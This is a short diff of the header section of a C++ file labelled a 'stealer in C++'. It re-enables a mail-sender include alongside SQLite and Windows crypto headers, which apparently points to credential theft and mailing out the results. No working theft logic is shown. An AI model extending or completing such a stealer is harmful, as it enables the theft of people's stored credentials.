@@ -3,22 +3,18 @@
 // Author      : Hleb Hatouka
 // Description : stealer in C++
 //============================================================================
-//#include "mailsender.h"
+
+#include "mailsender.h"
 #include <experimental/filesystem>
 #include <iostream>
 #include <string>
 #include <sstream>
 #include "sqlite3.h"
 
-
 #ifdef _WIN32
     #include <windows.h>
-    #include <wchar.h>
-    #include <conio.h>
-    #include <tchar.h>
     #include <Wincrypt.h>
-    //#pragma comment(lib, "crypt32.lib")
-    //#include <Lmcons.h>
+    #include <tchar.h>
 
     #ifndef UNICODE  
         typedef std::string String; 
